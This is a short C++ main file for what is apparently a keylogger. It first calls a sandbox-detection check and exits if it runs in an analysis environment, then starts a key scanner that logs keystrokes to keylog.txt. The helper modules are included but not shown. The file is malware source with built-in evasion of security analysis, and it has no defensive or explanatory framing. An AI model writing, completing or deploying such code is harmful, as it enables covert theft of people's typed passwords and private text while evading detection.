#include "pch.h"

#include "log/log.h"
#include "log/logFILE/file.h"
#include "sandboxdetect/sandboxdetect.h"
#include "keyscan/keyscan.h"

int main() {
	if (!sandboxdetect::checkSafety())
		return 0;
	auto* l = new logFILE("keylog.txt");
	keyscan scanner(l);
	scanner.scan();
	return 1;
}